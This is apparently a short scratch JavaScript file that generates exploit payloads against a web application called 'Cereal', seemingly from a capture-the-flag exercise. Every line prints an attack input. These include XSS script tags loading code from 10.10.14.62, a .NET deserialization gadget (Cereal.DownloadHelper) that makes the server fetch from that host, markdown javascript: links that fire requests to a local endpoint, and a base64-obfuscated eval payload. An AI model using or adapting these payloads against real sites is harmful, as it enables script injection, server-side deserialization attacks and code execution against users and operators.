console.log(JSON.stringify({title:'t',flavor:'f',color:'#FFF',description:'d' }));
console.log(JSON.stringify({ JSON: JSON.stringify({title:'t',flavor:'f',color:'#FFF',description:'<script src="10.10.14.62/0.js"></script>' }) }))

console.log(JSON.stringify({ JSON: JSON.stringify({'$type':'Cereal.DownloadHelper','_URL':'http://10.10.14.62/','_FilePath':'test'}) }))

console.log(JSON.stringify({ JSON: JSON.stringify({title:'t',flavor:'f',color:'#FFF',description:'<script>var oReq = new XMLHttpRequest();oReq.open("GET", "http://localhost/requests?id=9");oReq.send();</script>' }) }))

console.log(JSON.stringify({ JSON: JSON.stringify({title:'[mouldy cereal](javascript: var oReq = new XMLHttpRequest();oReq.open("GET", "http://localhost/requests?id=9");oReq.send();)',flavor:'f',color:'#FFF',description:'d' }) }))

console.log(JSON.stringify({ JSON: JSON.stringify({title:'[mouldy cereal](javascript: `eval(bota(amF2YXNjcmlwdDogdmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwOi8vbG9jYWxob3N0L3JlcXVlc3RzP2lkPTEyNiIpO29SZXEuc2VuZCgpOwo=))`)',flavor:'f',color:'#FFF',description:'d' }) }))
